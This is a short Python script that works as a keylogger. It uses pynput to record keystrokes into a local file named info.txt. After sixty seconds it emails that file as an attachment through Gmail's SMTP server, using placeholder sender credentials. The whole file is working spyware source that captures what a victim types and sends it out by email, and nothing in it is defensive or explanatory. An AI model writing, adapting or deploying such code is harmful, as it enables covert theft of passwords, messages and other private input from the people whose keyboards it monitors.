import smtplib
import threading
from pynput import keyboard
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

def keyPressed(key):
    print(str(key))
    with open("info.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error")


def send_email(sender_email, sender_password, receiver_email, subject, body, filename):
    # Setup the MIME
    message = MIMEMultipart()
    message['From'] = sender_email
    message['To'] = receiver_email
    message['Subject'] = subject
    message.attach(MIMEText(body, 'plain'))

    # Attachment
    with open(filename, 'rb') as attachment:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f"attachment; filename= {filename}")
    message.attach(part)

    # Connect to the SMTP server
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(sender_email, sender_password)

    # Send the email
    server.sendmail(sender_email, receiver_email, message.as_string())
    server.quit()

def start_listener():
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()

if __name__ == "__main__":
    threading.Thread(target=start_listener).start()
    
    wait_time = 60  
    print(f"Waiting for {wait_time} seconds...")
    threading.Timer(wait_time, send_email, args=('username@domain.com', 'password', 'username@domain.com', 'Email with Attachment', 'Please find attached file.', 'info.txt')).start()
    
    # Keep the main thread alive
    input("Press Enter to exit...")